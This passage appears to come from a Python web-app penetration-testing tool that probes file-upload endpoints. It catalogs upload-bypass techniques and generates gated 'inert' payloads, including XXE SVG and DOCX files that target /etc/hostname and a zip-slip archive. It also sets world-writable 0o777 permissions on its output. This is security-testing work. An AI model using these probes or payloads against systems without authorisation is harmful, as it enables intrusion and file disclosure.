                 "critical storage par", "payloads": "concurrent MANUAL wave",
                 "gate": "MANUAL-ONLY"})
    hyps.append({"hypothesis": "JPEG/PHP-GD polyglot re-coding differential",
                 "payloads": "MANUAL polyglot lab", "gate": "MANUAL-ONLY"})
    hyps.append({"hypothesis": "AV/CDN served-file takedown + cache lifetime "
                 "of uploaded canaries", "payloads": "GET-back timing",
                 "gate": "MANUAL-ONLY"})
    for r in upload_recs:
        if r.get("verdict") == "SUSPECTED" and r.get("ct_spoof_accepted"):
            hyps.append({"hypothesis": "CT-spoof se server-side processing "
                         "(thumb/GD/preview) trigger @ %s" % r["url"],
                         "payloads": "INERT png variants", "gate": "manual"})
            break
    return hyps


# ===========================================================================
# CWE / OWASP MAP
# ===========================================================================
def build_cwe_map():
    return {
        "mappings": [
            {"key": "upload_exec_content_type", "cwe": "CWE-434",
             "cwe_name": "Unrestricted Upload of File with Dangerous Type",
             "owasp": "A01:2021-Broken Access Control"},
            {"key": "upload_risky_ext_accepted", "cwe": "CWE-434",
             "cwe_name": "Unrestricted Upload of File with Dangerous Type",
             "owasp": "A01:2021-Broken Access Control"},
            {"key": "upload_filename_traversal", "cwe": "CWE-22",
             "cwe_name": "Improper Limitation of a Pathname to a Restricted "
             "Directory", "owasp": "A01:2021"},
            {"key": "upload_import_xxe", "cwe": "CWE-611",
             "cwe_name": "Improper Restriction of XML External Entity "
             "Reference", "owasp": "A05:2021-Security Misconfiguration"},
            {"key": "upload_no_validation", "cwe": "CWE-434",
             "cwe_name": "Unrestricted Upload", "owasp": "A01:2021"},
            {"key": "upload_svg_served_inline", "cwe": "CWE-79",
             "cwe_name": "XSS", "owasp": "A03:2021-Injection"},
            {"key": "upload_xss_content_type", "cwe": "CWE-436",
             "cwe_name": "Interpretation Conflict", "owasp": "A05:2021"},
            {"key": "upload_unauth_accessible", "cwe": "CWE-538",
             "cwe_name": "Insertion of Sensitive Information into Externally-"
             "Accessible File", "owasp": "A01:2021"},
            {"key": "upload_double_ext", "cwe": "CWE-646",
             "cwe_name": "Reliance on File Name Extension", "owasp": "A05:2021"},
            {"key": "upload_extension_blacklist", "cwe": "CWE-184",
             "cwe_name": "Incomplete List of Disallowed Inputs",
             "owasp": "A05:2021"},
            {"key": "upload_mime_bypass", "cwe": "CWE-436",
             "cwe_name": "Interpretation Conflict", "owasp": "A05:2021"},
            {"key": "upload_magic_missing", "cwe": "CWE-436",
             "cwe_name": "Interpretation Conflict", "owasp": "A05:2021"},
            {"key": "upload_client_only_filter", "cwe": "CWE-602",
             "cwe_name": "Client-Side Enforcement of Server-Side Security",
             "owasp": "A04:2021-Insecure Design"},
            {"key": "upload_filename_unicode", "cwe": "CWE-176",
             "cwe_name": "Improper Handling of Unicode Encoding",
             "owasp": "A05:2021"},
            {"key": "upload_nullbyte_legacy", "cwe": "CWE-626",
             "cwe_name": "Null Byte Interaction Error", "owasp": "A05:2021"},
            {"key": "upload_dir_listing", "cwe": "CWE-548",
             "cwe_name": "Exposure of Information Through Directory Listing",
             "owasp": "A05:2021"},
            {"key": "upload_overwrite_possible", "cwe": "CWE-641",
             "cwe_name": "Improper Restriction of Names for Files",
             "owasp": "A01:2021"},
            {"key": "upload_size_unlimited", "cwe": "CWE-770",
             "cwe_name": "Allocation of Resources Without Limits",
             "owasp": "A04:2021"},
            {"key": "upload_zip_slip", "cwe": "CWE-409",
             "cwe_name": "Improper Handling of Highly Compressed Data "
             "(archive escape family)", "owasp": "A01:2021"},
            {"key": "upload_path_disclosure", "cwe": "CWE-209",
             "cwe_name": "Error Message Information Exposure",
             "owasp": "A05:2021"},
        ],
        "note": "mapping hints - report me CVSS context ke saath use karo"}

# ===========================================================================
# MD REPORT BUILDERS
# ===========================================================================
def build_catalog_md():
    rows = [
        ("1", "Extension whitelist missing / blacklist bypass", "auto",
         "double-ext/case/trailing-dot/phtml variants - filename_variants()"),
        ("2", "Double-extension serving", "auto",
         "x.png.php accepted+raw served"),
        ("3", "Reverse double-extension", "auto",
         "x.php.png (naive whitelist ends-with .png)"),
        ("4", "Case-sensitivity trick", "auto", ".PhP/.pHp"),
        ("5", "Trailing dot/space (windows)", "auto", "x.php. / x.php <space>"),
        ("6", "Semicolon filename (tomcat/iis)", "auto", "x.php;.png"),
        ("7", "Null-byte legacy truncation", "auto(hyp)",
         "x.php<NUL>.png - modern runtimes immune"),
        ("8", "phtml/phar/php5 aliases", "auto", "whitelist gap variants"),
        ("9", "Content-Type spoof", "auto", "image/* vs octet-stream"),
        ("10", "Magic-byte absent", "auto", "GIF89a-as-png INERT differential"),
        ("11", "Filename traversal ../", "auto",
         "relative/absolute/deep/encoded"),
        ("12", "Filename unicode/fullwidth", "auto",
         "U+FF0E dot / normalization gap"),
        ("13", "Same-name overwrite", "auto", "canary overwrite differential"),
        ("14", "Unauthenticated getback", "auto", "anon identity fetch"),
        ("15", "Upload dir listing", "auto", "Index-of / href census"),
        ("16", "SVG inline serve -> XSS surface", "auto",
         "image/svg+xml + nosniff-absent"),
        ("17", "HTML-content CT serve", "auto", "text/html exec surface"),
        ("18", "SVG entity XXE (import)", "gated",
         "files_allow_import_xxe - INERT svg_entity.svg"),
        ("19", "DOCX entity XXE (import)", "gated",
         "files_allow_import_xxe - INERT docx zip"),
        ("20", "Zip-slip archive escape", "gated",
         "files_allow_archive - INERT ../ entries"),
        ("21", "Size-limit absence", "auto(hyp)", "2KB-capped bounded probes"),
        ("22", "Race-condition upload", "manual",
         "TOCTOU check-then-use window"),
        ("23", "JPEG/PHP polyglot", "manual", "GD re-coding differential"),
        ("24", "EXIF metadata XSS", "manual", "viewer-dependent"),
        ("25", "ImageTragick (MVG/delegate)", "manual",
         "processor fingerprint pehle"),
        ("26", "FFmpeg HLS playlist SSRF", "manual", "P15 chain media variant"),
        ("27", "phar:// deserialization", "manual", "PHP fingerprint"),
        ("28", "PDF embedded XXE", "manual", "parser endpoints"),
        ("29", ".htaccess/.user.ini/web.config upload", "FORBIDDEN-AUTO",
         "config mutation - sirf apne lab me"),
        ("30", "Webshell upload chain", "FORBIDDEN-AUTO",
         "INERT discipline - kabhi code payload nahi"),
        ("31", "Zip-bomb", "FORBIDDEN-AUTO", "DoS kabhi nahi"),
        ("32", "Chunked/boundary smuggling", "manual", "WAF differential"),
        ("33", "NTFS ADS filename", "manual", "windows-only"),
        ("34", "8.3 shortname collision", "manual", "legacy FS"),
        ("35", "CSV formula injection via import", "manual", "P12 handoff"),
        ("36", "S3 presigned URL/policy abuse", "manual", "P24 handoff"),
        ("37", "Client-side-only accept=", "auto", "server accepts sab"),
        ("38", "Random-rename hardening", "auto", "positive signal"),
        ("39", "Storage outside webroot", "auto(hyp)", "positive signal"),
        ("40", "Content-Disposition attachment", "auto", "positive signal"),
        ("41", "nosniff presence", "auto", "positive signal"),
        ("42", "MAX_FILE_SIZE client hint", "auto", "form census"),
        ("43", "Archive entry-traversal reflection", "gated", "zip-slip proof"),
        ("44", "Multi-param field confusion", "auto(hyp)",
         "param-census me kabhi 2 field"),
        ("45", "Upload URL in JSON response", "auto",
         "path-disclosure census"),
    ]
    out = ["# WASP P16 - File Upload Techniques Catalog (v%s)" % PLAN_VERSION,
           "",
           "45 upload-attack techniques: auto/gated/manual + FORBIDDEN-AUTO "
           "rows documented. Detection-only discipline (INERT content).", ""]
    for n, t, mode, note in rows:
        out.append("%s. **%s** [%s] - %s" % (n, t, mode, note))
    out.append("")
    out.append("**FORBIDDEN-AUTO** = kabhi automate nahi (RoE/lab MANUAL). "
               "**gated** = RoE config gate ON hone par INERT probes.")
    return "\n".join(out)


def _files_findings_md(F, meta, upload_recs, import_recs, archive_recs,
                       listings, chains, conf):
    L = ["# WASP P16 - UPLOAD FINDINGS (v%s)" % PLAN_VERSION, "",
         "Target: %s" % (meta.get("base_url") or "?"), "",
         "Mode: detection-only | INERT uploads | content REDACTED", "",
         "## Summary", "",
         "- Upload endpoints probed: **%d**" % len(upload_recs),
         "- Import/parser endpoints: **%d**" % len(import_recs),
         "- Archive probes (gated=%s): **%d**"
         % (not conf.get("files_allow_archive"), len(archive_recs)),
         "- Findings: **%d**" % len(F.items), ""]
    if F.items:
        L += ["| ID | Sev | Key | Endpoint | Title |", "|---|---|---|---|---|"]
        for f in F.items:
            L.append("| %s | %s | %s | %s | %s |" % (
                f["id"], f["severity"], f["key"],
                truncate(f["endpoint"], 60), truncate(f["title"], 70)))
        L.append("")
    L += ["## Upload endpoint verdicts", "",
          "| Endpoint | Verdict | Technique | Risky-accepts |", "|---|---|---|---|"]
    for r in upload_recs:
        L.append("| %s | %s | %s | %s |" % (
            truncate(r["url"], 55), r.get("verdict"),
            r.get("technique", "-"), ",".join(r.get("accepted_risky", [])[:4])))
    L += ["", "## Dir listing", ""]
    for d in listings:
        L.append("- %s -> listing=%s" % (d.get("dir"), d.get("listing")))
    L += ["", "## Kill-chains", ""]
    for c in chains:
        L.append("- **%s** [%s]%s" % (c["name"], c["severity"],
                                      " (MANUAL wave)" if c.get("manual_wave")
                                      else ""))
    L += ["", "## RoE gates", "",
          "- files_allow_import_xxe=%s (svg/docx entity payloads)"
          % bool(conf.get("files_allow_import_xxe")),
          "- files_allow_archive=%s (zip-slip INERT archive)"
          % bool(conf.get("files_allow_archive")),
          "- files_allow_cleanup=%s (best-effort DELETE of canary files)"
          % bool(conf.get("files_allow_cleanup")), ""]
    L += ["> Note: har upload INERT tha (FORBIDDEN_CONTENT_PATTERNS-enforced);"
          " getback content store nahi hua (sirf len/sha1/marker). Webshell/"
          "htaccess/zip-bomb rows FORBIDDEN-AUTO hain - manual wave documented "
          "files_test_plan.md me."]
    return "\n".join(L)


def _import_findings_md(import_recs, payload_files):
    L = ["# WASP P16 - IMPORT/XXE FINDINGS (v%s)" % PLAN_VERSION, "",
         "SVG/DOCX import parser trust census (P15 handoff).", ""]
    for r in import_recs:
        L += ["## %s" % r["url"], "",
              "- verdict: **%s**" % r.get("verdict"),
              "- signals: %s" % ", ".join(r.get("signals", [])),
              "- svg_plain: %s" % r.get("svg_plain"),
              "- docx_benign: %s" % r.get("docx_benign"), ""]
        for f in r.get("families", []):
            L.append("- family=%s status=%s marker=%s errdiff=%s"
                     % (f.get("family"), f.get("status"), f.get("marker"),
                        f.get("error_differential")))
        L.append("")
    L += ["INERT payload dir: upload_payloads/ (%d files)" % len(payload_files)]
    return "\n".join(L)


def _files_test_plan_md(hyps, chains, upload_recs, conf):
    L = ["# WASP P16 - Upload Manual Test Plan (v%s)" % PLAN_VERSION, "",
         "Auto-run ke baad ye MANUAL steps karo (RoE + apne lab me hi):", ""]
    i = 0
    for h in hyps:
        i += 1
        L.append("%d. %s (payload: %s | gate: %s)"
                 % (i, h["hypothesis"], h.get("payloads", "-"),
                    h.get("gate", "-")))
    L += ["", "## Kill-test ladder (RoE allow ho to)", "",
          "1. Benign canary -> exec-CT storage confirm (curl -i GET-back)",
          "2. SVG inline serve -> browser me console check (P13 chain)",
          "3. Import XXE -> OOB-less differential ko OOB canary se confirm",
          "4. Zip-slip -> extraction path ko server-side log se confirm",
          "5. Overwrite -> do accounts ke same-name files (P11 differential)",
          "", "## Existing auto results", ""]
    for r in upload_recs:
        L.append("- %s -> %s (%s)" % (r["url"], r.get("verdict"),
                                      r.get("technique", "-")))
    return "\n".join(L)


def _files_chains_text(chains, upload_recs, import_recs):
    L = ["# WASP P16 upload/import chains (detection-only)"]
    for c in chains:
        L.append("[%s] %s :: %s%s" % (
            c["severity"].upper(), c["name"], " -> ".join(c.get("steps", [])),
            " [MANUAL]" if c.get("manual_wave") else ""))
    L.append("")
    L.append("# endpoint quick-list")
    for r in upload_recs:
        L.append("%s %s %s" % (r.get("verdict", "?"),
                               ",".join(r.get("accepted_risky", [])[:3]), r["url"]))
    for r in import_recs:
        L.append("IMPORT %s %s" % (r.get("verdict", "?"), r["url"]))
    return "\n".join(L)


def write_upload_payloads(out, cap=8):
    """INERT payload dir (manual wave ke liye) - sab FORBIDDEN-checked."""
    d = _rwx_dir(os.path.join(out, "upload_payloads"))
    canary = _canary("pl")
    items = [
        ("canary.png", magic_png(canary),
         "PNG-header canary (magic/CT probes)"),
        ("canary.txt", plain_text(canary), "Plain text canary"),
        ("gif89a_canary.txt", magic_gif(canary),
         "GIF89a text polyglot (magic-check differential)"),
        ("svg_plain.svg", svg_plain(canary), "Benign SVG (serve-CT analysis)"),
        ("svg_entity.svg", svg_entity(canary, "/etc/hostname"),
         "XXE-detection SVG (RoE-gated: files_allow_import_xxe)"),
        ("docx_entity_import.docx", docx_entity_bytes(canary, "/etc/hostname"),
         "XXE-detection docx (RoE-gated)"),
        ("zipslip_canary.zip", zipslip_bytes(canary),
         "Zip-slip INERT archive (RoE-gated: files_allow_archive)"),
    ]
    written = []
    for name, content, note in items[:max(1, cap)]:
        assert_inert(content, "payload:%s" % name)
        p = os.path.join(d, name)
        mode = "wb" if isinstance(content, bytes) else "w"
        with open(p, mode) as f:
            f.write(content)
        _rwx_result(p)
        written.append(name)
    _rwx_save_text(os.path.join(d, "README.txt"),
                   "WASP P16 INERT upload payloads\n"
                   "===============================\n"
                   "Sab payloads FORBIDDEN_CONTENT_PATTERNS-checked (INERT).\n"
                   "Koi webshell/code/DoS payload nahi - manual wave bhi INERT\n"
                   "discipline follow kare. Gated payloads sirf RoE allow par.\n\n"
                   + "\n".join("- %s: %s" % (n, note) for n, _, note in items))
    written.append("README.txt")
    return written

# ===========================================================================
# STAGE K: REPORTS + FEEDFORWARD + MANIFEST
# ===========================================================================
def write_reports(out, scope, F, ctx, meta, results_by_stage, hypotheses,
                  ranked, chains, conf):
    upload_recs = results_by_stage.get("upload", {}).get("data", [])
    import_recs = results_by_stage.get("import", {}).get("data", [])
    archive_recs = results_by_stage.get("archive", {}).get("data", [])
    listings = results_by_stage.get("listing", {}).get("data", [])
    tm = results_by_stage.get("techniques", {}).get("data", [])
    diff = results_by_stage.get("differential", {}).get("data", {})
    forms = results_by_stage.get("forms", {}).get("data", [])

    _rwx_save_json(os.path.join(out, "upload_surface.json"), {
        "phase": PHASE, "version": PLAN_VERSION, "generated": now_iso(),
        "engagement": scope.engagement, "base_url": meta.get("base_url"),
        "sources_mined": meta.get("sources", []),
        "upload_paths": meta.get("upload_paths", [])[:50],
        "file_fields": meta.get("file_fields", []),
        "param_hints": meta.get("param_hints", []),
        "ranked": ranked, "coverage": ctx.get("coverage", {})})
    _rwx_save_text(os.path.join(out, "upload_targets.txt"), "\n".join(
        "%s %s %s %s" % (t["kind"], t["score"], t["param"], t["url"])
        for t in ranked) + "\n")
    _rwx_save_json(os.path.join(out, "upload_form_census.json"), {
        "forms": forms, "cold_harvest": meta.get("cold_forms", [])})
    _rwx_save_json(os.path.join(out, "upload_matrix.json"), upload_recs)
    _rwx_save_json(os.path.join(out, "filename_matrix.json"), {
        "variants": filename_variants("waspP16doc", cap=20),
        "tricks": filename_trick_variants("waspP16doc", cap=8)})
    _rwx_save_json(os.path.join(out, "ct_matrix.json"), {
        "variants": ct_variants(cap=10),
        "accepted_by_endpoint": {r["url"]: r.get("ct_spoof_accepted", [])
                                 for r in upload_recs}})
    _rwx_save_json(os.path.join(out, "magic_matrix.json"), {
        r["url"]: r.get("magic_probe", {}) for r in upload_recs})
    _rwx_save_json(os.path.join(out, "getback_matrix.json"), [{
        "url": r["url"], "located": r.get("located_urls", []),
        "getback": r.get("getback"), "anon_getback": r.get("anon_getback")}
        for r in upload_recs])
    _rwx_save_json(os.path.join(out, "serve_matrix.json"), {
        "exec_cts": EXEC_CTS, "safe_disposal": SAFE_DISPOSAL,
        "records": [{"url": r["url"],
                     "served_exec": r.get("served_exec", [])}
                    for r in upload_recs]})
    _rwx_save_json(os.path.join(out, "import_xxe_matrix.json"), import_recs)
    _rwx_save_json(os.path.join(out, "archive_matrix.json"), archive_recs)
    _rwx_save_json(os.path.join(out, "dir_listing_matrix.json"), listings)
    _rwx_save_json(os.path.join(out, "waf_map_files.json"), {
        "endpoints": [{"url": r["url"],
                       "waf": (r.get("baseline") or {}).get("waf"),
                       "blocked": r.get("verdict") == "BLOCKED"}
                      for r in upload_recs]})
    _rwx_save_json(os.path.join(out, "differential_files.json"), diff)
    _rwx_save_json(os.path.join(out, "technique_matrix_files.json"), tm)
    _rwx_save_json(os.path.join(out, "cwe_owasp_map_files.json"),
                   build_cwe_map())
    probe_log = []
    for r in upload_recs:
        for k, v in (r.get("probes") or {}).items():
            if isinstance(v, dict):
                probe_log.append({"endpoint": r["url"], "probe": k,
                                  "status": v.get("status"),
                                  "len": v.get("len"), "score": v.get("score")})
        for x in r.get("ext_matrix", []):
            probe_log.append({"endpoint": r["url"], "probe": "ext:%s" %
                              x.get("label"), "status": x.get("status"),
                              "accepted": x.get("accepted")})
    _rwx_save_json(os.path.join(out, "upload_probe_log.json"), probe_log[:500])

    deep_recs = results_by_stage.get("deep", {}).get("data", [])
    _rwx_save_json(os.path.join(out, "ext_acceptance_matrix.json"),
                   [d.get("ext_model") for d in deep_recs
                    if d.get("ext_model")])
    _rwx_save_json(os.path.join(out, "multipart_matrix.json"),
                   [d.get("confusion") for d in deep_recs
                    if d.get("confusion")])
    _rwx_save_json(os.path.join(out, "magic_consistency.json"),
                   [d.get("magic_consistency") for d in deep_recs
                    if d.get("magic_consistency")])
    _rwx_save_json(os.path.join(out, "client_bypass_matrix.json"),
                   [d.get("client_bypass") for d in deep_recs
                    if d.get("client_bypass")])
    _rwx_save_json(os.path.join(out, "exotic_formats.json"),
                   [d.get("exotic") for d in deep_recs if d.get("exotic")])
    _rwx_save_json(os.path.join(out, "svg_ssrf_matrix.json"),
                   [d.get("svg_ssrf") for d in deep_recs
                    if d.get("svg_ssrf")])
    _rwx_save_json(os.path.join(out, "race_analysis.json"),
                   [d.get("race") for d in deep_recs if d.get("race")])
    _rwx_save_json(os.path.join(out, "metadata_matrix.json"),
                   [d.get("metadata") for d in deep_recs
                    if d.get("metadata")])
    _rwx_save_json(os.path.join(out, "put_method_matrix.json"),
                   results_by_stage.get("put", {}).get("data", []))
    stg = results_by_stage.get("storage", {})
    _rwx_save_json(os.path.join(out, "storage_fingerprint.json"), stg)
    _rwx_save_json(os.path.join(out, "rename_policy.json"),
                   stg.get("rename_policy", {}))
    _rwx_save_json(os.path.join(out, "mitre_map.json"), build_mitre_map())

    payload_files = write_upload_payloads(out)
    ctx["pocs"] = ctx.get("pocs", []) + ["upload_payloads/" + p
                                         for p in payload_files]

    _rwx_save_text(os.path.join(out, "UPLOAD_FINDINGS.md"), _files_findings_md(
        F, meta, upload_recs, import_recs, archive_recs, listings, chains,
        conf))
    _rwx_save_text(os.path.join(out, "IMPORT_XXE_FINDINGS.md"),
                   _import_findings_md(import_recs, payload_files))
    _rwx_save_text(os.path.join(out, "files_test_plan.md"),
                   _files_test_plan_md(hypotheses, chains, upload_recs, conf))
    _rwx_save_text(os.path.join(out, "files_chains.txt"),
                   _files_chains_text(chains, upload_recs, import_recs))
    _rwx_save_text(os.path.join(out, "TECHNIQUES_CATALOG_FILES.md"),
                   build_catalog_md())
    _rwx_save_text(os.path.join(out, "EXEC_SUMMARY.md"),
                   build_exec_summary_md(meta, upload_recs, import_recs,
                                         archive_recs, deep_recs, chains,
                                         conf))
    _rwx_save_json(os.path.join(out, "findings.json"),
                   {"module": NAME, "phase": PHASE, "version": PLAN_VERSION,
                    "count": len(F.items), "findings": F.items,
                    "generated": now_iso()})

    up_conf = [r["url"] for r in upload_recs if r.get("verdict") == "CONFIRMED"]
    up_susp = [r["url"] for r in upload_recs if r.get("verdict") == "SUSPECTED"]
    imp_conf = [r["url"] for r in import_recs if r.get("verdict") == "CONFIRMED"]
    imp_skipped = [r["url"] for r in import_recs
                   if r.get("verdict") == "SKIPPED"]
    write_feedforward(out, PHASE, {
        "to_phase17_api": {"upload_endpoints": [r["url"] for r in upload_recs],
                           "file_fields": meta.get("file_fields", [])},
        "to_phase18_gql": {"upload_mutation_hints": [r["url"] for r in
                                                     upload_recs
                                                     if r.get("param")]},
        "to_phase20_logic": {"size_unlimited": [r["url"] for r in upload_recs
                                                if r.get("probes", {}).get(
                                                    "benign")],
                             "overwrite_endpoints": [r["url"] for r in
                                                     upload_recs if
                                                     r.get("overwrite_probe",
                                                           {}).get(
                                                               "overwritten")]},
        "to_phase23_misconfig": {"dir_listings": [d["dir"] for d in listings
                                                  if d.get("listing")],
                                 "unauth_getback": [r["url"] for r in
                                                    upload_recs if
                                                    r.get("anon_getback",
                                                          {}).get("served")]},
        "to_phase13_lfi": {"stored_canary_urls": sorted(
            {u for r in upload_recs
             for u in r.get("located_urls", [])})[:20]},
        "to_phase15_stored_fetch": {
            "upload_urls": [r["url"] for r in upload_recs],
            "svg_rasterizer_endpoints": [d["url"] for d in deep_recs
                                         if d.get("svg_ssrf")]},
        "to_phase24_cloud": {"presign_hypotheses": "MANUAL-ONLY (s3/blob)",
                             "storage_backends": sorted(
                                 {str(s.get("backend")) for s in
                                  (results_by_stage.get("storage", {})
                                   .get("data") or [])})},
        "to_phase28_chains": {"chains": [c["name"] for c in chains]},
        "to_phase32_report": {"findings": len(F.items),
                              "by_severity": _sev_counts(F),
                              "chains": len(chains)},
    }, notes=["detection-only; INERT uploads; content redacted; webshell/"
              "htaccess FORBIDDEN-AUTO"])

    files = ["upload_surface.json", "upload_targets.txt",
             "upload_form_census.json", "upload_matrix.json",
             "filename_matrix.json", "ct_matrix.json", "magic_matrix.json",
             "getback_matrix.json", "serve_matrix.json",
             "import_xxe_matrix.json", "archive_matrix.json",
             "dir_listing_matrix.json", "waf_map_files.json",
             "differential_files.json", "technique_matrix_files.json",
             "cwe_owasp_map_files.json", "upload_probe_log.json",
             "UPLOAD_FINDINGS.md", "IMPORT_XXE_FINDINGS.md",
             "files_test_plan.md", "files_chains.txt",
             "TECHNIQUES_CATALOG_FILES.md", "EXEC_SUMMARY.md",
             "ext_acceptance_matrix.json", "multipart_matrix.json",
             "magic_consistency.json", "client_bypass_matrix.json",
             "exotic_formats.json", "svg_ssrf_matrix.json",
             "race_analysis.json", "metadata_matrix.json",
             "put_method_matrix.json", "storage_fingerprint.json",
             "rename_policy.json", "mitre_map.json",
             "findings.json", "feedforward.json"]
    files += ["upload_payloads/" + p for p in payload_files]
    write_manifest(out, PHASE, files, stats={
        "targets": len(ranked), "upload_endpoints": len(upload_recs),
        "import_endpoints": len(import_recs),
        "archive_endpoints": len(archive_recs),
        "probes_total": meta.get("probes_total", 0),
        "findings": len(F.items), "chains": len(chains),
        "deep_endpoints": len(deep_recs or []),
        "put_dirs": len(results_by_stage.get("put", {}).get("data", [])),
        "mode": ctx.get("mode", "active")})
    return files


def _rwx_tree(root):
    """Output folder ka compact tree + RWX enforce sab files par."""
    try:
        os.chmod(root, 0o777)
    except OSError:
        pass
    lines = []
    for dirpath, dirnames, filenames in os.walk(root):
        dirnames.sort()
        for d in dirnames:
            _rwx_dir(os.path.join(dirpath, d))
        rel = os.path.relpath(dirpath, root)
        indent = "" if rel == "." else "  " * (rel.count(os.sep) + 1)
        if rel != ".":
            lines.append("%s%s/" % ("  " * rel.count(os.sep),
                                    os.path.basename(dirpath)))
        for fn in sorted(filenames):
            fp = os.path.join(dirpath, fn)
            _rwx_result(fp)
            lines.append("%s%s (%s)" % (indent, fn, human_size(os.path.getsize(fp))))
    return lines


# ===========================================================================
# MAIN RUN (stages A->K wiring, passive mode, resume-safe)
# ===========================================================================
def run(cfg, scope, base_out):
    t_start = time.time()
    out, ev, http, cp = module_ctx(cfg, scope, base_out, NAME)
    conf = dict(DEFAULTS)
    for k in list(conf.keys()):
        if hasattr(cfg, k):
            conf[k] = getattr(cfg, k)

    head("Phase 16 - File Upload (detection-only, INERT) (v%s) | %s"
         % (PLAN_VERSION, scope.describe()))
    warn("Upload discipline: 100% INERT content (FORBIDDEN_CONTENT_PATTERNS "
         "enforced) | canary filenames | getback content REDACTED.")
    if conf.get("files_allow_svg_ssrf"):
        warn("SVG-SSRF diff ON (files_allow_svg_ssrf=true) - same-origin "
             "<image> paths only, zero external egress.")
    if conf.get("files_allow_put_method"):
        warn("PUT/DAV probe ON (files_allow_put_method=true) - INERT canary "
             "PUT, canary-named target only.")
    if conf.get("files_allow_race"):
        warn("Race probe ON (files_allow_race=true) - <=4 INERT concurrent "
             "same-name canaries (TOCTOU hypothesis).")
    if conf.get("files_allow_import_xxe"):
        warn("Import XXE ON (files_allow_import_xxe=true) - INERT entity "
             "payloads, parser differential.")
    if conf.get("files_allow_archive"):
        warn("Archive zip-slip ON (files_allow_archive=true) - INERT ../ "
             "entries, canary names.")
    if conf.get("files_allow_cleanup"):
        warn("Cleanup DELETE ON (files_allow_cleanup=true) - sirf APNE "
             "located canary URLs.")
    info("caps: upload-endpoints=%s | ext-variants=%s | ct-variants=%s | "
         "tricks=%s | cold-start=%s"
         % (conf.get("files_upload_endpoints"), conf.get("files_ext_variants"),
            conf.get("files_ct_variants"), conf.get("files_filename_tricks"),
            conf.get("files_cold_start")))

    F = Findings()
    meta = {"probes_total": 0}
    ctx = {"out": out, "coverage": {}, "pocs": [], "mode": "active",
           "base_dir": os.path.join(base_out, scope.engagement)}
    results_by_stage = {}
    qhttp = quiet_client(http, cfg, scope, ev)

    # ---------------- Stage A: discovery ----------------
    head("Stage A - Upload surface discovery (P15/P5/P2/P7/P12/P9/P8-seeded)")
    ckA = "stageA:discovery"
    if cp.is_done(ckA):
        cached = cp.result_of(ckA) or ([], {})
        ranked, meta = cached[0], dict(cached[1])
        meta["probes_total"] = meta.get("probes_total", 0)
        ok("Replayed %d targets (checkpoint)" % len(ranked))
    else:
        ranked, meta = discover_files_surface(base_out, scope, conf)
        meta["probes_total"] = meta.get("probes_total", 0)
        cp.mark(ckA, [ranked, meta], summary="files surface")
    ctx["mined_sources"] = meta.get("sources", [])
    ok("seed artifacts: %d sources | %d ranked targets"
       % (len(ctx["mined_sources"]), len(ranked)))
    up_targets = [t for t in ranked if t["kind"] in ("upload", "import")]
    imp_targets = [t for t in ranked if t["kind"] == "import"]
    gb_targets = [t for t in ranked if t["kind"] == "getback"]
    ctx["coverage"]["surface"] = ("upload=%d import=%d getback=%d"
                                  % (len(up_targets), len(imp_targets),
                                     len(gb_targets)))
    ok("%s" % ctx["coverage"]["surface"])

    if not ranked:
        err("Koi upload surface nahi mila. P2 (forms) / P5 (content) / P15 "
            "(import handoff) pehle chalao ya scope.json check karo.")
        F.add("upload_surface_sparse", "Upload surface khali",
              scope.describe(),
              "seed artifacts nahi mile - P2 multipart forms + P5 upload "
              "paths + P15 svg_doc_endpoints chalao.", "upload_surface.json")
        ctx["coverage"]["surface"] = "NOT-FOUND"
        write_reports(out, scope, F, ctx, meta, {}, [], [], [], conf)
        return out

    base_url = meta.get("base_url") or scope.seed_urls()[0]

    # ---------------- PASSIVE MODE ----------------
    if not getattr(cfg, "allow_active", True):
        warn("allow_active=False -> PASSIVE mode: seed census + offline "
             "hypotheses (0 network probes, 0 uploads).")
        ctx["mode"] = "passive"
        hyps = build_files_hypotheses([], [], [], conf)
        chains = build_files_chains(F, [], [], [], [])
        write_reports(out, scope, F, ctx, meta, {"upload": {"data": []}},
                      hyps, ranked, chains, conf)
        write_feedforward(out, PHASE, {"to_phase32_report":
                                       {"mode": "passive"}},
                          notes=["allow_active=false -> 0-probe passive run"])
        write_manifest(out, PHASE, ["upload_surface.json", "upload_targets.txt",
                                    "files_test_plan.md", "findings.json",
                                    "feedforward.json"],
                       stats={"mode": "passive", "targets": len(ranked),
                              "hypotheses": len(hyps)})
        _rwx_tree(out)
        return out

    # ---------------- Stage B: baseline + form census ----------------
    head("Stage B - Baseline & WAF calibration (+ form census + cold-start)")
    try:
        s404 = soft404_baseline(http, base_url)
        meta["soft404"] = s404 or {}
        ok("soft-404 baseline: %s" % ("set" if s404 else "flat"))
    except Exception as e:
        meta["soft404"] = {}
        warn("soft-404 baseline skip: %s" % e)
    home_sig = pick_home_marker(http, base_url, meta)
    meta["home_marker"] = bool(home_sig)
    forms_census = list(meta.get("form_hints", []))
    try:
        cold = harvest_upload_forms(http, base_url, conf, cp, meta)
        meta["cold_forms"] = cold
        seen_act = {f.get("action") for f in cold if f.get("action")}
        forms_census = forms_census + [
            {"url": f.get("action"), "fields": f.get("file_fields", []),
             "via": f.get("via")} for f in cold
            if f.get("action") and f["action"] not in seen_act]
        ok("cold-start: %d multipart forms mile" % len(cold))
    except Exception as e:
        warn("cold-start skip: %s" % truncate(str(e), 80))
    results_by_stage["forms"] = {"data": forms_census}
    form_by_url = {}
    for f in (meta.get("cold_forms") or []):
        if f.get("action"):
            form_by_url[f["action"].split("?")[0]] = f
    for f in (meta.get("form_hints") or []):
        u = (f.get("action") or f.get("url") or "")
        if u and u.split("?")[0] not in form_by_url:
            form_by_url[u.split("?")[0]] = f
    ok("baselines + census: %d upload targets | %d form hints"
       % (len(up_targets), len(forms_census)))

    # ---------------- Stage C: upload engine ----------------
    head("Stage C - Upload engine (benign census + ext/CT/magic/trick matrix)")
    upload_recs = []
    up_cap = int(conf.get("files_upload_endpoints", 10))
    up_pool = [t for t in up_targets if t["kind"] == "upload"][:up_cap]
    for i, t in enumerate(up_pool, 1):
        ck = "upload:%s" % t["url"]
        if cp.is_done(ck):
            rec = cp.result_of(ck)
        else:
            rec = upload_probe_endpoint(http, qhttp, t, base_url, meta, conf,
                                        cp, home_sig,
                                        form=form_by_url.get(
                                            t["url"].split("?")[0]))
            cp.mark(ck, rec, summary="%s %s" % (rec.get("verdict"),
                                                rec.get("technique", "")))
        upload_recs.append(rec)
        print("  [%d/%d] %s %s" % (i, len(up_pool), rec["verdict"],
                                   t["url"][:64]))
        if interrupted():
            warn("Interrupt - clean stop (resume karo).")
            break
    results_by_stage["upload"] = {"data": upload_recs}
